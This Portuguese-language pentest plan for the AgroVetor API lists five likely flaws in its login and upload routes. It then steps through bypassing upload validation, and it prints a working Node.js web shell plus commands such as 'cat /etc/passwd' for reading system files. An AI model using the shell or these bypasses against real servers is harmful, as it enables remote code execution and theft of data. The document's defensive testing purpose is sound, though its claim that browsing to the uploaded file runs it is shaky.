
# Análise de Vulnerabilidades de Segurança - AgroVetor API

**Foco:** Rotas Críticas (`POST /api/login`, `POST /api/upload-shp`)
**Executor:** Jules, QA & Security Engineer

---

## 1. Top 5 Vulnerabilidades a Investigar

Com base nas funcionalidades das rotas (`autenticação` e `upload de arquivos`), estas são as cinco principais vulnerabilidades que eu procuraria ativamente, em ordem de probabilidade e impacto:

### 1. Insecure File Upload (Upload de Arquivo Inseguro) - Rota: `/api/upload-shp`
- **Descrição:** A falha mais crítica e provável. Ocorre se a aplicação não validar corretamente o tipo, o conteúdo e o nome do arquivo que está sendo enviado. Um atacante poderia enviar um arquivo malicioso (como um web shell) em vez de um arquivo `.shp` e, potencialmente, executá-lo no servidor, ganhando controle total.
- **Impacto:** **Crítico**. Risco de Execução Remota de Código (RCE), comprometimento total do servidor, vazamento de dados e acesso a outros sistemas na mesma rede.

### 2. SQL Injection (Injeção de SQL) - Rota: `/api/login`
- **Descrição:** Ocorre se os dados fornecidos pelo usuário (email/senha) forem concatenados diretamente em uma query SQL, em vez de usar parameterized queries (prepared statements). Um atacante pode manipular a query para contornar a lógica de autenticação.
- **Impacto:** **Crítico**. Permite bypass de autenticação, acesso a contas de outros usuários (incluindo administradores) e, em muitos casos, a extração de todos os dados do banco, como tabelas de usuários e senhas hasheadas.

### 3. Broken Authentication (Credential Stuffing & Brute Force) - Rota: `/api/login`
- **Descrição:** A rota de login pode ser vulnerável a ataques de força bruta (tentar múltiplas senhas para um usuário) ou credential stuffing (tentar listas de credenciais vazadas). Isso acontece se não houver mecanismos de proteção como rate limiting (limite de tentativas) ou um CAPTCHA após falhas repetidas.
- **Impacto:** **Alto**. Acesso não autorizado a contas de usuários, levando ao roubo de dados e identidade.

### 4. Sensitive Data Exposure (Exposição de Dados Sensíveis) - Rota: `/api/login`
- **Descrição:** A resposta da API em caso de falha de login pode vazar informações. Por exemplo, mensagens de erro distintas como "Usuário não encontrado" vs. "Senha incorreta" permitem que um atacante enumere usuários válidos no sistema.
- **Impacto:** **Médio**. Facilita ataques direcionados (como brute force) ao confirmar a existência de um email no banco de dados.

### 5. Missing Function Level Access Control (Ausência de Controle de Acesso em Nível de Função) - Rota: `/api/upload-shp`
- **Descrição:** A vulnerabilidade ocorre se a API não verificar se o usuário autenticado tem *permissão* para realizar o upload. Um usuário comum poderia, por exemplo, acessar uma função que deveria ser restrita a administradores, como sobrescrever um arquivo `.shp` global.
- **Impacto:** **Médio a Alto**. Dependendo da função, pode levar à corrupção de dados, negação de serviço ou escalonamento de privilégios.

---

## 2. Detalhes da Exploração: Insecure File Upload (Vulnerabilidade Mais Crítica)

Aqui está o passo a passo de como eu, como pentester, tentaria explorar a vulnerabilidade de Insecure File Upload na rota `/api/upload-shp`.

**Objetivo:** Obter Execução Remota de Código (RCE) no servidor do Render.

### Passo 1: Reconhecimento e Análise da Requisição
- Usaria uma ferramenta como o **Burp Suite** para interceptar a requisição de upload legítima.
- Analisaria os cabeçalhos (`Content-Type`, `Content-Disposition`) e o corpo da requisição para entender como o arquivo é enviado.
- **Observaria:** A API espera um `Content-Type` específico, como `application/zip` ou `application/octet-stream` para o arquivo `.shp` (que geralmente vem em um `.zip`)? Ela valida a extensão do arquivo apenas no nome (`filename="mapa.zip"`)?

### Passo 2: Teste de Bypass de Validação (Tentativa 1 - Alteração Simples)
- **Ação:** Manteria o nome do arquivo com uma extensão permitida (ex: `malicioso.zip`), mas colocaria um web shell PHP ou Node.js (um arquivo de texto simples com código) dentro do `.zip`.
- **Hipótese:** A aplicação verifica a extensão do `.zip`, mas não o conteúdo.
- **Resultado Esperado:** Se o upload for bem-sucedido, o próximo desafio seria encontrar uma forma de descompactar o arquivo no servidor para liberar o shell.

### Passo 3: Teste de Bypass de Validação (Tentativa 2 - Manipulação de `Content-Type`)
- **Ação:** Renomearia meu web shell para `shell.php` e tentaria fazer o upload diretamente.
- O `Content-Type` na requisição seria alterado para algo que a API possa esperar, como `application/zip`, mesmo que o conteúdo seja um script PHP/Node.js.
- **Hipótese:** A aplicação confia no `Content-Type` enviado pelo cliente e não verifica os "magic bytes" (a assinatura real) do arquivo.
- **Resultado Esperado:** O arquivo `shell.php` é salvo no servidor.

### Passo 4: Teste de Bypass de Validação (Tentativa 3 - Double Extension)
- **Ação:** Nomearia meu arquivo como `mapa.shp.php`.
- **Hipótese:** A aplicação tem uma validação de extensão fraca que apenas verifica se a string `.shp` existe em algum lugar no nome do arquivo.
- **Resultado Esperado:** O servidor salva o arquivo, mas sistemas baseados em Apache/PHP podem interpretá-lo como um script PHP por causa da extensão final.

### Passo 5: Localização e Execução do Web Shell
- Após um upload bem-sucedido de um arquivo malicioso (ex: `shell.js`), o desafio final é descobrir a URL para acessá-lo.
- **Técnicas:**
    - A resposta da API ao upload pode vazar o caminho (ex: `{"message": "Upload com sucesso!", "path": "/uploads/123/shell.js"}`).
    - Se não, eu tentaria adivinhar diretórios comuns: `/uploads/`, `/static/files/`, etc.
- **Execução:**
    - Uma vez que a URL `https://meu-sistema-staging.onrender.com/uploads/shell.js` fosse encontrada, acessá-la em um navegador executaria o código no servidor.
    - Um web shell simples em Node.js poderia ser:
      ```javascript
      // shell.js
      const { exec } = require('child_process');
      const http = require('http');
      http.createServer((req, res) => {
        const url = new URL(req.url, `http://${req.headers.host}`);
        const command = url.searchParams.get('cmd'); // Pega o comando da URL
        if (command) {
          exec(command, (err, stdout, stderr) => {
            res.end(stdout || stderr);
          });
        } else {
          res.end('Web shell is active. Use ?cmd=... to execute commands.');
        }
      }).listen(8081); // Tenta ouvir em uma porta, embora o upload seja mais simples
      ```
    - **Acesso Final:** `https://.../shell.js?cmd=ls -la` para listar arquivos no servidor, ou `cat /etc/passwd` para ler arquivos sensíveis, confirmando o RCE.
